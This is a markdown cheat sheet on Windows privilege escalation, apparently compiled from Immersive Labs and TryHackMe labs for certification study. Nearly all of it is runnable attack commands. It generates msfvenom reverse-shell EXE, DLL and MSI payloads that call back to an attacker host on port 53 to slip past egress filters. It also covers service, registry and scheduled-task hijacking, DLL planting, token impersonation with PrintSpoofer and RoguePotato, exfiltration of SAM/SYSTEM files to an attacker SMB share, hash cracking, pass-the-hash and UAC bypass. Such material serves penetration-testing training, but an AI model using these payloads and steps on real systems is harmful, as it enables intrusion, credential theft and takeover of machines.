# Windows Privilege Escalation Cheat Sheet
> Based on the Immersive Labs Windows Privilege Escalation series and TryHackMe Windows PrivEsc Arena.

---

## Table of Contents
- [Account Types and Concepts](#account-types-and-concepts)
- [Setup](#setup)
- [Manual Enumeration](#manual-enumeration)
- [Automated Enumeration](#automated-enumeration)
- [Finding Passwords](#finding-passwords)
- [Service Exploits](#service-exploits)
- [Registry](#registry)
- [DLL Hijacking](#dll-hijacking)
- [Token Impersonation](#token-impersonation)
- [Credential Attacks](#credential-attacks)
- [Scheduled Tasks and Startup](#scheduled-tasks-and-startup)
- [Miscellaneous Techniques](#miscellaneous-techniques)
- [Payload Generation and Listener](#payload-generation-and-listener)
- [Quick Reference Table](#quick-reference-table)

---

## Account Types and Concepts

| Account | Description |
|---|---|
| Standard User | Limited access, permissions-based. Typical foothold account. |
| Administrator | Full local access. Member of Administrators group. Interactive. |
| SYSTEM | Highest privilege. Non-interactive. Runs most services. |
| LocalSystem | Alias for SYSTEM — same SID, same privileges. Appears in service configs. |

**Vertical escalation** — low-priv user to SYSTEM/Administrator on the same machine.  
**Horizontal escalation** — low-priv user to a different user account (pivoting).

**Universal privilege escalation question: can I write to it, and does something higher-privileged execute it?**

---

## Setup

### Transfer tools to target
```bash
# Kali: serve tools directory
cd /home/kali/Desktop/Tools/Windows
sudo python3 -m http.server 80
```
On Windows target, browse to `http://[KALI-IP]` and download what you need.

### Transfer via SMB
```bash
# Kali: host current directory over SMB
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
```cmd
# Windows: copy from SMB share
copy \\<KALI_IP>\kali\reverse.exe C:\PrivEsc\reverse.exe
```

### Generate reverse shell executable
```bash
# EXE — for service exploits and general use
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe

# DLL — for DLL hijacking
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o target.dll

# MSI — for AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi

# Meterpreter variant (if using Metasploit listener)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
```

> Port 53 (DNS) blends in and bypasses common egress firewall rules.

### Start a listener
```bash
# Netcat
sudo nc -nvlp 53

# Metasploit
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <KALI_IP>; set lport 4444; exploit"
```

### Migrate Meterpreter session (do this immediately)
```meterpreter
migrate -N LogonUI.exe
```
> Approximately 60 seconds before a fake service process is killed. Migrate first.

---

## Manual Enumeration

### System and user recon
```cmd
whoami
whoami /priv
whoami /groups
net users
net user [username]
net localgroup
net localgroup administrators
systeminfo
hostname
```

### Services and tasks
```cmd
net start                          # running services
tasklist /SVC                      # processes linked to services
tasklist /V                        # includes running user — useful for GUI app escalation
wmic service list brief
wmic service where (state="running") get name, caption, startmode, startname
schtasks /query /fo LIST /v        # all scheduled tasks
```

### GUI tools
```cmd
lusrmgr.msc    # local users and groups
msinfo32       # full system info
regedit        # registry editor
taskmgr        # task manager (shows SYSTEM processes)
```

### PowerShell history
```powershell
history    # current session
```
Saved history file — open via Run (Win+R):
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Startup folders
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

### Registry run keys
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

> Startup folder payloads run as the authenticating user, not SYSTEM. Scheduled tasks can run as SYSTEM and are a higher value target.

### Installed software
```cmd
wmic /OUTPUT:software.txt product get name
```

---

## Automated Enumeration

### WinPEAS
```cmd
winpeas.exe
winpeas.exe notcolor log    # output to out.txt, no colour codes
.\winPEASany.exe
```
Red text = misconfiguration or special privilege. Key sections: CVE suggestions, modifiable services, accessible home folders, files containing "password" in the name.

### PowerUp
```powershell
Import-Module ./PowerUp.ps1
Invoke-AllChecks
. .\PowerUp.ps1; Invoke-AllChecks
Get-Help [cmdlet] --full
```

### Seatbelt
```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=all > output.txt
.\Seatbelt.exe -group=all
```
Key sections: AutoRuns and LOLBAS.

### SharpUp
```cmd
.\SharpUp.exe audit
```

> Automated tools give you leads, not answers. Always manually verify before attempting to exploit.

---

## Finding Passwords

### Search file contents by keyword
```cmd
cd C:\
findstr /m /s /i password *.txt
findstr /m /s /i password *.xml *.ini
findstr /m /s /i password *.ps1
findstr /m /s /i secret *.txt
findstr /m /s /i username *.txt
findstr /m /s /i credentials *.txt
```

Multi-keyword loop using a wordlist:
```cmd
for /F %i in (wordlist.txt) do ( findstr /M /C:%i /S *.txt )
```

### Search filenames by keyword
```cmd
dir /s *pass* == *cred* == *secret*
dir /s *config* == *configuration* == *conf*
```

### Registry credential search
```cmd
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f credentials /t REG_SZ /s
reg query HKCU /f secret /t REG_SZ /s
```

### Saved RDP connections
```cmd
# Current user
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers\[IP]"

# Other users — get SIDs first
reg query "HKEY_USERS"
reg query "HKEY_USERS\[SID]\Software\Microsoft\Terminal Server Client\Servers"
```
Look for `UsernameHint` values. Blocked if Credential Guard is enabled.

### AutoLogon credentials in registry
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
Look for `DefaultUsername` and `DefaultPassword` values stored in plaintext.

### PowerShell scripts
Check `.ps1` files for `Get-Content` references — even if no plaintext password exists in the script, it may point to a file that contains one.

> Base64 is not encryption. Decode any base64 strings immediately:
> ```powershell
> [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($encodedString))
> ```
> ```bash
> echo "[base64string]" | base64 -d
> ```

---

## Service Exploits

### Insecure service permissions
If your user has `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM, redirect its binary path to your reverse shell.

```cmd
# Check user permissions on the service
accesschk.exe /accepteula -uwcqv user <servicename>
accesschk.exe -uwcqv "[username]" *

# Confirm service runs as SYSTEM
sc qc <servicename>

# Redirect binary path
sc config <servicename> binpath= "\"C:\PrivEsc\reverse.exe\""
sc stop <servicename>
sc start <servicename>
```

Look for: `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`. `SERVICE_START_NAME: LocalSystem` in sc qc output.

### Unquoted service path
Windows tries multiple path interpretations when a service binary path has spaces and no quotes. Plant your shell at the first writable resolved path.

```cmd
# Find all unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check write access to the directory
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
icacls "C:\Program Files\Unquoted Path Service\"

# Plant reverse shell with the correct name
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

net start <servicename>
```

**How Windows resolves `C:\Program Files\Unquoted Path Service\Common Files\service.exe`:**
```
C:\Program.exe                                              <- tried first
C:\Program Files\Unquoted.exe                              <- tried second
C:\Program Files\Unquoted Path Service\Common.exe          <- plant here if writable
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```

**Payload naming logic — name matches last word before the space at your writable level:**

| Writable folder | Payload name |
|---|---|
| `C:\` | `Program.exe` |
| `C:\Program Files\` | `Custom.exe` |
| `C:\Program Files\Custom Service\` | `Example.exe` |

### Weak registry permissions
If the registry key for a service is writable, overwrite `ImagePath` to point to your reverse shell.

```cmd
# Check registry key permissions
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicename>
accesschk.exe /accepteula "[username]" -kvuqsw HKLM\System\CurrentControlSet\Services

# PowerShell alternative
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Format-List * | Out-String | Set-Content -Path $HOME\Desktop\output.txt

# Confirm the service
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<servicename>

# Overwrite ImagePath via reg command
reg add HKLM\SYSTEM\CurrentControlSet\services\<servicename> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# Or overwrite via regedit — navigate to the key and edit ImagePath directly
```

Look for: `KEY_ALL_ACCESS`, `KEY_SET_VALUE`, or `KEY_WRITE`. Check `ObjectName` (must be LocalSystem), `Start` value (`0x2` = AutoStart).

> `NT AUTHORITY\INTERACTIVE` covers all users with an active interactive or RDP session — a broad and often overlooked permission.

### Insecure service executable
When the service binary file itself is world-writable, replace it with your reverse shell directly.

```cmd
# Check file permissions
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"

# Replace binary
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

net start <servicename>
```

Look for: `Everyone` or `BUILTIN\Users` with `FILE_ALL_ACCESS` or `FILE_WRITE_DATA`.

### Service exploit comparison

| Technique | What is weak | Method |
|---|---|---|
| Insecure service permissions | Service object ACL | `sc config` binpath |
| Unquoted service path | Unquoted path + writable directory | Plant binary at resolved path |
| Weak registry ACL | Registry key ACL | `reg add` ImagePath or regedit |
| Insecure service executable | Binary file ACL | Overwrite `.exe` directly |

---

## Registry

### AutoRun binary hijack
AutoRun entries execute automatically on user logon. If the referenced binary is writable and a privileged user logs in, you get a shell with their privileges.

```cmd
# Find AutoRun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check write access on the binary
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# Replace with reverse shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```
Trigger by opening a new RDP session — fires on logon.

### AlwaysInstallElevated
When both HKLM and HKCU `AlwaysInstallElevated` keys are set to `1`, Windows Installer runs all `.msi` packages as SYSTEM regardless of who triggers them.

```cmd
# Both must return 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
# Generate malicious MSI (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi
```
```cmd
# Execute on Windows
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

---

## DLL Hijacking

### Three variants

| Type | Condition | Action |
|---|---|---|
| Weak DLL permissions | You can write to the DLL file itself | Overwrite it directly |
| Search order hijack | You can write to a folder earlier in the search order | Plant DLL with same name higher up |
| Missing DLL | DLL does not exist anywhere | Plant DLL anywhere in the search order |

### DLL search order
1. Folder containing the executable
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current directory
6. Directories in the system PATH
7. Directories in the user PATH

### Find missing DLLs with Procmon
Add the following filters:
- Result → is → `NAME NOT FOUND`
- Path → ends with → `.dll`
- User → contains → `SYSTEM` (or `Administrator`)

Double-click a result and open the Process tab to confirm a privileged user is running the process.

### Check write permissions on DLL search paths
```cmd
icacls "C:\Program Files\Backup Files\Daily Backup"
accesschk.exe /accepteula -uwdq "C:\Some\Writable\Dir\"
```

```bash
# Generate malicious DLL (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o missing.dll
```
```cmd
# Place in the writable directory with the exact expected name
copy missing.dll "C:\Some\Writable\Dir\missing.dll"
```

---

## Token Impersonation

> All techniques in this section require `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, commonly held by service accounts, IIS app pools, and MSSQL service users.

```cmd
# Check for impersonation privileges
whoami /priv
whoami /priv | findstr /i "impersonate\|assignprimarytoken"
```

### PrintSpoofer
Tricks the Print Spooler service (SYSTEM) into authenticating to a fake named pipe, then impersonates the captured SYSTEM token.

```cmd
# Get a service account shell first (simulate via PSExec in labs)
PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

# In the service account shell
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

Look for: `SeImpersonatePrivilege` enabled. Print Spooler service must be running (`sc query spooler`).

### RoguePotato
Forces a SYSTEM-level DCOM process to authenticate to a rogue server on Kali. Use as a fallback when PrintSpoofer is not viable.

```bash
# Set up socat redirector on Kali
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999

# Start second listener
sudo nc -nvlp 53
```
```cmd
# In the service account shell
C:\PrivEsc\RoguePotato.exe -r <KALI_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
```

### Potato variant comparison

| Tool | Best for | Notes |
|---|---|---|
| PrintSpoofer | Windows 10 / Server 2016+ | No redirector needed. Requires Print Spooler running. |
| RoguePotato | Windows 10 / Server 2016+ | Needs socat redirector. Good fallback. |
| GodPotato | Windows 10/11 / Server 2019/2022 | Most modern option. |
| SweetPotato | Windows 10 / Server 2016/2019 | Combines multiple techniques. |
| JuicyPotato | Pre-Server 2019 | Older systems. Requires specific CLSID. |
| HotPotato | Windows 7/8 / early Win 10 | NBNS/WPAD spoofing based. |

---

## Credential Attacks

### Saved credentials (runas)
Windows can cache credentials used with `runas`. If admin credentials are saved, run any process as that user with no password prompt.

```cmd
# List saved credentials
cmdkey /list

# If no saved creds exist yet, refresh them
C:\PrivEsc\savecred.bat

# Run reverse shell as admin using saved credentials
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### SAM database dump
The SAM file stores NTLM password hashes, encrypted with a boot key in the SYSTEM file. With both files you can extract and crack hashes offline.

Look for SAM and SYSTEM backup files in `C:\Windows\Repair\` or `C:\Windows\System32\config\RegBack\`.

```cmd
# Transfer SAM and SYSTEM files to Kali
copy C:\Windows\Repair\SAM \\<KALI_IP>\kali\
copy C:\Windows\Repair\SYSTEM \\<KALI_IP>\kali\

# Also check RegBack
copy C:\Windows\System32\config\RegBack\SAM \\<KALI_IP>\kali\
copy C:\Windows\System32\config\RegBack\SYSTEM \\<KALI_IP>\kali\
```
```bash
# Dump hashes (use Tib3rius creddump7 — Kali default is outdated for Win 10)
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM

# Crack the NTLM hash
hashcat -m 1000 --force <HASH> /usr/share/wordlists/rockyou.txt

# Log in with cracked password
winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
```

### Pass the Hash
NTLM authentication accepts the hash itself as proof of identity. You never need the plaintext password.

```bash
pth-winexe -U 'admin%<LM:NTLM_HASH>' //<TARGET_IP> cmd.exe

# Alternatives
impacket-psexec admin@<TARGET_IP> -hashes <LM:NTLM>
impacket-wmiexec admin@<TARGET_IP> -hashes <LM:NTLM>
crackmapexec smb <TARGET_IP> -u admin -H <NTLM> -x whoami
```

The full hash format is `LM:NTLM` — both parts separated by a colon.

### Use found credentials for remote shell
```bash
winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
```

---

## Scheduled Tasks and Startup

### Writable scheduled task script
If a scheduled task runs as SYSTEM and executes a script you can write to, append your reverse shell command.

```cmd
# Enumerate scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# Check write access on the script
accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# Append reverse shell command
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```
Wait for the next scheduled run or trigger manually if you have permissions.

### Writable startup folder
Files in the global StartUp folder execute for every user at logon. Plant a reverse shell — it fires when any admin logs in.

```cmd
# Check write access
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# Copy reverse shell or create a shortcut
copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.exe"

# Alternatively create a shortcut using the lab VBS helper
cscript C:\PrivEsc\CreateShortcut.vbs
```
Trigger by opening a new RDP session as admin:
```bash
rdesktop -u admin <TARGET_IP>
```

---

## Miscellaneous Techniques

### UAC bypass
If you have a medium-integrity admin session, UAC blocks full admin access. Bypasses elevate your process to high integrity without triggering a prompt.

```cmd
# Check current integrity level
whoami /groups | findstr /i "medium\|high\|administrators"

# Common bypass methods
eventvwr.exe      # environment variable hijack — Windows 7 to 10
fodhelper.exe     # registry hijack — Windows 10
CMSTP.exe         # INF file based
```
Automated tool covering many bypass techniques: https://github.com/hfiref0x/UACME

### Insecure GUI application
GUI applications running as admin expose file open/save dialogs. Use the address bar to launch `cmd.exe` — it inherits the elevated context of the parent application.

```cmd
# Confirm the app is running as admin
tasklist /V | findstr mspaint.exe

# In the app: File > Open
# Click the address/navigation bar and type:
file://c:/windows/system32/cmd.exe
```

### Weak file and folder permissions (general)
Any executable run by a privileged process that you can overwrite is a potential vector.

```cmd
# Check directory permissions
accesschk.exe /accepteula -uwdq "C:\SomeDirectory\"

# Check file permissions
accesschk.exe /accepteula -quvw "C:\SomePath\file.exe"
icacls "C:\SomePath\file.exe"
```

---

## Payload Generation and Listener

### Generate payloads (Kali)
```bash
# EXE payload — service exploits and general use
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe

# EXE Meterpreter variant
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe

# DLL payload — DLL hijacking
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o target.dll

# MSI payload — AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi
```

### Start listener
```bash
# Netcat
sudo nc -nvlp 53

# Metasploit
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <KALI_IP>; set lport 4444; exploit"
```

### On Meterpreter shell — migrate immediately
```meterpreter
migrate -N LogonUI.exe
```

---

## Quick Reference Table

| Technique | What is exploited | Privilege gained | Key check |
|---|---|---|---|
| Weak service ACL | SERVICE_CHANGE_CONFIG permission | SYSTEM | `accesschk -uwcqv` |
| Unquoted service path | Spaces in unquoted BINARY_PATH_NAME | SYSTEM | `wmic service get pathname` |
| Weak registry ACL | Writable service registry key | SYSTEM | `accesschk -uvwqk` |
| Writable service binary | World-writable service .exe | SYSTEM | `accesschk -quvw` |
| AutoRun hijack | Writable AutoRun binary | Admin | `reg query ...CurrentVersion\Run` |
| AlwaysInstallElevated | GPO allows .msi to run as SYSTEM | SYSTEM | `reg query ...AlwaysInstallElevated` |
| Registry plaintext creds | AutoLogon password stored in plaintext | Admin | `reg query ...winlogon` |
| Saved credentials | Cached runas credentials | Admin | `cmdkey /list` |
| SAM dump and crack | Insecure backup of SAM/SYSTEM | Admin | `C:\Windows\Repair\` |
| Pass the Hash | NTLM auth accepts raw hash | Admin | Any obtained NTLM hash |
| Scheduled task script | Writable script run by SYSTEM task | SYSTEM | `schtasks /query` + `accesschk` |
| Startup folder | Writable global StartUp directory | Admin | `accesschk -d StartUp` |
| PrintSpoofer | SeImpersonatePrivilege + Print Spooler | SYSTEM | `whoami /priv` |
| RoguePotato | SeImpersonatePrivilege + DCOM | SYSTEM | `whoami /priv` |
| DLL hijacking | Missing or writable DLL on load path | SYSTEM | Procmon NAME NOT FOUND |
| Insecure GUI app | Elevated GUI exposes file dialog | Admin | `tasklist /V` |
| UAC bypass | Medium integrity admin session | Admin (High) | `whoami /groups` |

---

*Part of a structured cybersecurity career roadmap — working toward OSWE and CWEE.*
